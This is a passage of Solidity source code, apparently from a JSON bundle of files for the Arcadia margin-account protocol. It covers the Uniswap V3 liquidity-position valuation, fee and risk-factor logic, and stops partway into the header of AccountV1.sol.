  /**\n     * @notice Calculates the underlying token amounts of a liquidity position, given external trusted prices.\n     * @param tickLower The lower tick of the liquidity position.\n     * @param tickUpper The upper tick of the liquidity position.\n     * @param priceToken0 The price of 1e18 tokens of token0 in USD, with 18 decimals precision.\n     * @param priceToken1 The price of 1e18 tokens of token1 in USD, with 18 decimals precision.\n     * @return amount0 The amount of underlying token0 tokens.\n     * @return amount1 The amount of underlying token1 tokens.\n     */\n    function _getPrincipalAmounts(\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 liquidity,\n        uint256 priceToken0,\n        uint256 priceToken1\n    ) internal pure returns (uint256 amount0, uint256 amount1) {\n        // Calculate the square root of the relative rate sqrt(token1/token0) from the trusted USD price of both tokens.\n        // sqrtPriceX96 is a binary fixed point number with 96 digits precision.\n        uint160 sqrtPriceX96 = _getSqrtPriceX96(priceToken0, priceToken1);\n\n        // Calculate amount0 and amount1 of the principal (the liquidity position without accumulated fees).\n        (amount0, amount1) = LiquidityAmounts.getAmountsForLiquidity(\n            sqrtPriceX96, TickMath.getSqrtRatioAtTick(tickLower), TickMath.getSqrtRatioAtTick(tickUpper), liquidity\n        );\n    }\n\n    /**\n     * @notice Calculates the sqrtPriceX96 (token1/token0) from trusted USD prices of both tokens.\n     * @param priceToken0 The price of 1e18 tokens of token0 in USD, with 18 decimals precision.\n     * @param priceToken1 The price of 1e18 tokens of token1 in USD, with 18 decimals precision.\n     * @return sqrtPriceX96 The square root of the price (token1/token0), with 96 binary precision.\n     * @dev The price in Uniswap V3 is defined as:\n     * price = amountToken1/amountToken0.\n     * The usdPriceToken is defined as: usdPriceToken = amountUsd/amountToken.\n     * => amountToken = amountUsd/usdPriceToken.\n     * Hence we can derive the Uniswap V3 price as:\n     * price = (amountUsd/usdPriceToken1)/(amountUsd/usdPriceToken0) = usdPriceToken0/usdPriceToken1.\n     */\n    function _getSqrtPriceX96(uint256 priceToken0, uint256 priceToken1) internal pure returns (uint160 sqrtPriceX96) {\n        if (priceToken1 == 0) return TickMath.MAX_SQRT_RATIO;\n\n        // Both priceTokens have 18 decimals precision and result of division should also have 18 decimals precision.\n        // -> multiply by 1e18\n        uint256 priceXd18 = priceToken0.mulDivDown(1e18, priceToken1);\n        // Square root of a number with 18 decimals precision has 9 decimals precision.\n        uint256 sqrtPriceXd9 = FixedPointMathLib.sqrt(priceXd18);\n\n        // Change sqrtPrice from a decimal fixed point number with 9 digits to a binary fixed point number with 96 digits.\n        // Unsafe cast: Cast will only overflow when priceToken0/priceToken1 >= 2^128.\n        sqrtPriceX96 = uint160((sqrtPriceXd9 << FixedPoint96.RESOLUTION) / 1e9);\n    }\n\n    /**\n     * @notice Calculates the underlying token amounts of accrued fees, both collected and uncollected.\n     * @param id The id of the Liquidity Position.\n     * @return amount0 The amount of fees in underlying token0 tokens.\n     * @return amount1 The amount of fees in underlying token1 tokens.\n     */\n    function _getFeeAmounts(uint256 id) internal view returns (uint256 amount0, uint256 amount1) {\n        (\n            ,\n            ,\n            address token0,\n            address token1,\n            uint24 fee,\n            int24 tickLower,\n            int24 tickUpper,\n            uint256 liquidity, // gas: cheaper to use uint256 instead of uint128.\n            uint256 feeGrowthInside0LastX128,\n            uint256 feeGrowthInside1LastX128,\n            uint256 tokensOwed0, // gas: cheaper to use uint256 instead of uint128.\n            uint256 tokensOwed1 // gas: cheaper to use uint256 instead of uint128.\n        ) = NON_FUNGIBLE_POSITION_MANAGER.positions(id);\n\n        (uint256 feeGrowthInside0CurrentX128, uint256 feeGrowthInside1CurrentX128) =\n            _getFeeGrowthInside(token0, token1, fee, tickLower, tickUpper);\n\n        // Calculate the total amount of fees by adding the already realized fees (tokensOwed),\n        // to the accumulated fees since the last time the position was updated:\n        // (feeGrowthInsideCurrentX128 - feeGrowthInsideLastX128) * liquidity.\n        // Fee calculations in NonfungiblePositionManager.sol overflow (without reverting) when\n        // one or both terms, or their sum, is bigger than a uint128.\n        // This is however much bigger than any realistic situation.\n        unchecked {\n            amount0 = FullMath.mulDiv(\n                feeGrowthInside0CurrentX128 - feeGrowthInside0LastX128, liquidity, FixedPoint128.Q128\n            ) + tokensOwed0;\n            amount1 = FullMath.mulDiv(\n                feeGrowthInside1CurrentX128 - feeGrowthInside1LastX128, liquidity, FixedPoint128.Q128\n            ) + tokensOwed1;\n        }\n    }\n\n    /**\n     * @notice Calculates the current fee growth inside the Liquidity Range.\n     * @param token0 Token0 of the Liquidity Pool.\n     * @param token1 Token1 of the Liquidity Pool.\n     * @param fee The fee of the Liquidity Pool.\n     * @param tickLower The lower tick of the liquidity position.\n     * @param tickUpper The upper tick of the liquidity position.\n     * @return feeGrowthInside0X128 The amount of fees in underlying token0 tokens.\n     * @return feeGrowthInside1X128 The amount of fees in underlying token1 tokens.\n     */\n    function _getFeeGrowthInside(address token0, address token1, uint24 fee, int24 tickLower, int24 tickUpper)\n        internal\n        view\n        returns (uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128)\n    {\n        IUniswapV3Pool pool = IUniswapV3Pool(PoolAddress.computeAddress(UNISWAP_V3_FACTORY, token0, token1, fee));\n\n        // To calculate the pending fees, the current tick has to be used, even if the pool would be unbalanced.\n        (, int24 tickCurrent,,,,,) = pool.slot0();\n        (,, uint256 lowerFeeGrowthOutside0X128, uint256 lowerFeeGrowthOutside1X128,,,,) = pool.ticks(tickLower);\n        (,, uint256 upperFeeGrowthOutside0X128, uint256 upperFeeGrowthOutside1X128,,,,) = pool.ticks(tickUpper);\n\n        // Calculate the fee growth inside of the Liquidity Range since the last time the position was updated.\n        // feeGrowthInside can overflow (without reverting), as is the case in the Uniswap fee calculations.\n        unchecked {\n            if (tickCurrent < tickLower) {\n                feeGrowthInside0X128 = lowerFeeGrowthOutside0X128 - upperFeeGrowthOutside0X128;\n                feeGrowthInside1X128 = lowerFeeGrowthOutside1X128 - upperFeeGrowthOutside1X128;\n            } else if (tickCurrent < tickUpper) {\n                feeGrowthInside0X128 =\n                    pool.feeGrowthGlobal0X128() - lowerFeeGrowthOutside0X128 - upperFeeGrowthOutside0X128;\n                feeGrowthInside1X128 =\n                    pool.feeGrowthGlobal1X128() - lowerFeeGrowthOutside1X128 - upperFeeGrowthOutside1X128;\n            } else {\n                feeGrowthInside0X128 = upperFeeGrowthOutside0X128 - lowerFeeGrowthOutside0X128;\n                feeGrowthInside1X128 = upperFeeGrowthOutside1X128 - lowerFeeGrowthOutside1X128;\n            }\n        }\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                    RISK VARIABLES MANAGEMENT\n    ///////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Returns the risk factors of an asset for a Creditor.\n     * @param creditor The contract address of the Creditor.\n     * @param asset The contract address of the asset.\n     * @param assetId The id of the asset.\n     * @return collateralFactor The collateral factor of the asset for the Creditor, 4 decimals precision.\n     * @return liquidationFactor The liquidation factor of the asset for the Creditor, 4 decimals precision.\n     */\n    function getRiskFactors(address creditor, address asset, uint256 assetId)\n        external\n        view\n        override\n        returns (uint16 collateralFactor, uint16 liquidationFactor)\n    {\n        bytes32[] memory underlyingAssetKeys = _getUnderlyingAssets(_getKeyFromAsset(asset, assetId));\n\n        address[] memory assets = new address[](2);\n        uint256[] memory assetIds = new uint256[](2);\n\n        (assets[0], assetIds[0]) = _getAssetFromKey(underlyingAssetKeys[0]);\n        (assets[1], assetIds[1]) = _getAssetFromKey(underlyingAssetKeys[1]);\n\n        (uint16[] memory collateralFactors, uint16[] memory liquidationFactors) =\n            IRegistry(REGISTRY).getRiskFactors(creditor, assets, assetIds);\n\n        // Lower risk factors with the protocol wide risk factor.\n        uint256 riskFactor = riskParams[creditor].riskFactor;\n\n        // Keep the lowest risk factor of all underlying assets.\n        // Unsafe cast: collateralFactor and liquidationFactor are smaller than or equal to 1e4.\n        collateralFactor = uint16(\n            collateralFactors[0] < collateralFactors[1]\n                ? riskFactor.mulDivDown(collateralFactors[0], AssetValuationLib.ONE_4)\n                : riskFactor.mulDivDown(collateralFactors[1], AssetValuationLib.ONE_4)\n        );\n        liquidationFactor = uint16(\n            liquidationFactors[0] < liquidationFactors[1]\n                ? riskFactor.mulDivDown(liquidationFactors[0], AssetValuationLib.ONE_4)\n                : riskFactor.mulDivDown(liquidationFactors[1], AssetValuationLib.ONE_4)\n        );\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                          PRICING LOGIC\n    ///////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Returns the USD value of an asset.\n     * @param creditor The contract address of the Creditor.\n     * @param underlyingAssetsAmounts The corresponding amount(s) of Underlying Asset(s), in the decimal precision of the Underlying Asset.\n     * @param rateUnderlyingAssetsToUsd The USD rates of 10**18 tokens of underlying asset, with 18 decimals precision.\n     * @return valueInUsd The value of the asset denominated in USD, with 18 Decimals precision.\n     * @return collateralFactor The collateral factor of the asset for a given Creditor, with 4 decimals precision.\n     * @return liquidationFactor The liquidation factor of the asset for a given Creditor, with 4 decimals precision.\n     * @dev We take the most conservative (lowest) risk factor of all underlying assets.\n     */\n    function _calculateValueAndRiskFactors(\n        address creditor,\n        uint256[] memory underlyingAssetsAmounts,\n        AssetValueAndRiskFactors[] memory rateUnderlyingAssetsToUsd\n    ) internal view override returns (uint256 valueInUsd, uint256 collateralFactor, uint256 liquidationFactor) {\n        // \"rateUnderlyingAssetsToUsd\" is the USD value with 18 decimals precision for 10**18 tokens of Underlying Asset.\n        // To get the USD value (also with 18 decimals) of the actual amount of underlying assets, we have to multiply\n        // the actual amount with the rate for 10**18 tokens, and divide by 10**18.\n        valueInUsd = underlyingAssetsAmounts[0].mulDivDown(rateUnderlyingAssetsToUsd[0].assetValue, 1e18)\n            + underlyingAssetsAmounts[1].mulDivDown(rateUnderlyingAssetsToUsd[1].assetValue, 1e18);\n\n        // Lower risk factors with the protocol wide risk factor.\n        uint256 riskFactor = riskParams[creditor].riskFactor;\n\n        // Keep the lowest risk factor of all underlying assets.\n        collateralFactor = rateUnderlyingAssetsToUsd[0].collateralFactor < rateUnderlyingAssetsToUsd[1].collateralFactor\n            ? riskFactor.mulDivDown(rateUnderlyingAssetsToUsd[0].collateralFactor, AssetValuationLib.ONE_4)\n            : riskFactor.mulDivDown(rateUnderlyingAssetsToUsd[1].collateralFactor, AssetValuationLib.ONE_4);\n        liquidationFactor = rateUnderlyingAssetsToUsd[0].liquidationFactor\n            < rateUnderlyingAssetsToUsd[1].liquidationFactor\n            ? riskFactor.mulDivDown(rateUnderlyingAssetsToUsd[0].liquidationFactor, AssetValuationLib.ONE_4)\n            : riskFactor.mulDivDown(rateUnderlyingAssetsToUsd[1].liquidationFactor, AssetValuationLib.ONE_4);\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                    WITHDRAWALS AND DEPOSITS\n    ///////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Increases the exposure to an asset on a direct deposit.\n     * @param creditor The contract address of the Creditor.\n     * @param asset The contract address of the asset.\n     * @param assetId The id of the asset.\n     * @param amount The amount of tokens.\n     * @return recursiveCalls The number of calls done to different asset modules to process the deposit/withdrawal of the asset.\n     * @return assetType Identifier for the type of the asset:\n     * 0 = ERC20.\n     * 1 = ERC721.\n     * 2 = ERC1155\n     * ...\n     * @dev super.processDirectDeposit checks that msg.sender is the Registry.\n     */\n    function processDirectDeposit(address creditor, address asset, uint256 assetId, uint256 amount)\n        public\n        override\n        returns (uint256 recursiveCalls, uint256 assetType)\n    {\n        // Amount deposited of a Uniswap V3 LP can be either 0 or 1 (checked in the Account).\n        // For uniswap V3 every id is a unique asset -> on every deposit the asset must added to the Asset Module.\n        if (amount == 1) _addAsset(assetId);\n\n        // Also checks that msg.sender == Registry.\n        (recursiveCalls, assetType) = super.processDirectDeposit(creditor, asset, assetId, amount);\n    }\n\n    /**\n     * @notice Increases the exposure to an asset on an indirect deposit.\n     * @param creditor The contract address of the Creditor.\n     * @param asset The contract address of the asset.\n     * @param assetId The id of the asset.\n     * @param exposureUpperAssetToAsset The amount of exposure of the upper asset to the asset of this Asset Module.\n     * @param deltaExposureUpperAssetToAsset The increase or decrease in exposure of the upper asset to the asset of this Asset Module since last interaction.\n     * @return recursiveCalls The number of calls done to different asset modules to process the deposit/withdrawal of the asset.\n     * @return usdExposureUpperAssetToAsset The USD value of the exposure of the upper asset to the asset of this Asset Module, 18 decimals precision.\n     * @dev super.processIndirectDeposit checks that msg.sender is the Registry.\n     * @dev deltaExposureUpperAssetToAsset of a Uniswap V3 LP must be either 0 or 1 for processIndirectDeposit().\n     */\n    function processIndirectDeposit(\n        address creditor,\n        address asset,\n        uint256 assetId,\n        uint256 exposureUpperAssetToAsset,\n        int256 deltaExposureUpperAssetToAsset\n    ) public override returns (uint256 recursiveCalls, uint256 usdExposureUpperAssetToAsset) {\n        // deltaExposureUpperAssetToAsset of a Uniswap V3 LP can be either 0 or 1.\n        // For uniswap V3 every id is a unique asset -> on a deposit, the asset must added to the Asset Module.\n        if (deltaExposureUpperAssetToAsset == 1) _addAsset(assetId);\n        else if (deltaExposureUpperAssetToAsset != 0) revert InvalidAmount();\n\n        // Also checks that msg.sender == Registry.\n        (recursiveCalls, usdExposureUpperAssetToAsset) = super.processIndirectDeposit(\n            creditor, asset, assetId, exposureUpperAssetToAsset, deltaExposureUpperAssetToAsset\n        );\n    }\n\n    /**\n     * @notice Decreases the exposure to an asset on a direct withdrawal.\n     * @param creditor The contract address of the Creditor.\n     * @param asset The contract address of the asset.\n     * @param assetId The id of the asset.\n     * @param amount The amount of tokens.\n     * @dev super.processDirectWithdrawal checks that msg.sender is the Registry.\n     * @dev If the asset is withdrawn, remove its liquidity from the mapping.\n     * If we would keep the liquidity of the asset in storage,\n     * _getUnderlyingAssets() would keep using the liquidity of the asset at the time of deposit.\n     * This might result in a wrongly calculated getValue() of the non-deposited asset (for off-chain purposes).\n     */\n    function processDirectWithdrawal(address creditor, address asset, uint256 assetId, uint256 amount)\n        public\n        override\n        returns (uint256 assetType)\n    {\n        // Also checks that msg.sender == Registry.\n        assetType = super.processDirectWithdrawal(creditor, asset, assetId, amount);\n\n        // Amount withdrawn of a Uniswap V3 LP can be either 0 or 1 (checked in the Account).\n        if (amount == 1) delete assetToLiquidity[assetId];\n    }\n\n    /**\n     * @notice Decreases the exposure to an asset on an indirect withdrawal.\n     * @param creditor The contract address of the creditor.\n     * @param asset The contract address of the asset.\n     * @param assetId The id of the asset.\n     * @param exposureUpperAssetToAsset The amount of exposure of the upper asset to the asset of this Asset Module.\n     * @param deltaExposureUpperAssetToAsset The increase or decrease in exposure of the upper asset to the asset of this Asset Module since last interaction.\n     * @return usdExposureUpperAssetToAsset The USD value of the exposure of the upper asset to the asset of this Asset Module, 18 decimals precision.\n     * @dev super.processIndirectWithdrawal checks that msg.sender is the Registry.\n     * @dev If the asset is withdrawn, remove its liquidity from the mapping.\n     * If we would keep the liquidity of the asset in storage,\n     * _getUnderlyingAssets() would keep using the liquidity of the asset at the time of deposit.\n     * This might result in a wrongly calculated getValue() of the non-deposited asset (for off-chain purposes).\n     * @dev deltaExposureUpperAssetToAsset of a Uniswap V3 LP must be either 0 or -1 for processIndirectWithdrawal().\n     * But we do NOT revert if the value is different from 0 or -1, since this would block withdrawals and hence liquidations,\n     * which is worse as having wrongly calculated exposures.\n     */\n    function processIndirectWithdrawal(\n        address creditor,\n        address asset,\n        uint256 assetId,\n        uint256 exposureUpperAssetToAsset,\n        int256 deltaExposureUpperAssetToAsset\n    ) public override returns (uint256 usdExposureUpperAssetToAsset) {\n        // Also checks that msg.sender == Registry.\n        usdExposureUpperAssetToAsset = super.processIndirectWithdrawal(\n            creditor, asset, assetId, exposureUpperAssetToAsset, deltaExposureUpperAssetToAsset\n        );\n\n        // deltaExposureUpperAssetToAsset of a Uniswap V3 LP can be either 0 or -1.\n        if (deltaExposureUpperAssetToAsset == -1) delete assetToLiquidity[assetId];\n    }\n}"
    },
    {
      "filename": "accounts-v2/src/accounts/AccountV1.sol",
      "content": "/**\n * Created by Pragma Labs\n * SPDX-License-Identifier: BUSL-1.1\n */\npragma solidity 0.8.22;\n\nimport { AccountErrors } from \"../libraries/Errors.sol\";\nimport { AccountStorageV1 } from \"./AccountStorageV1.sol\";\nimport { ERC20, SafeTransferLib } from \"../../lib/solmate/src/utils/SafeTransferLib.sol\";\nimport { AssetValuationLib, AssetValueAndRiskFactors } from \"../libraries/AssetValuationLib.sol\";\nimport { IERC721 } from \"../interfaces/IERC721.sol\";\nimport { IERC1155 } from \"../interfaces/IERC1155.sol\";\nimport { IRegistry } from \"../interfaces/IRegistry.sol\";\nimport { ICreditor } from \"../interfaces/ICreditor.sol\";\nimport { IActionBase, ActionData } from \"../interfaces/IActionBase.sol\";\nimport { IAccount } from \"../interfaces/IAccount.sol\";\nimport { IFactory } from \"../interfaces/IFactory.sol\";\nimport { IPermit2 } from \"../interfaces/IPermit2.sol\";\n\n/**\n * @title Arcadia Accounts\n * @author Pragma Labs\n * @notice Arcadia Accounts are smart contracts that act as onchain, decentralized and composable margin accounts.\n * They provide individuals, DAOs, and other protocols with a simple and flexible way to deposit and manage multiple assets as collateral.\n * The total combination of assets can be used as margin to back liabilities issued by any financial protocol (lending, leverage, futures...).\n * @dev Users can use this Account to deposit assets (fungible, non-fungible, LP positions, yiel bearing assets...).\n * The Account will denominate all the deposited assets into one Numeraire (one unit of account, like USD or ETH).\n * Users can use the single"
    }
  ]
}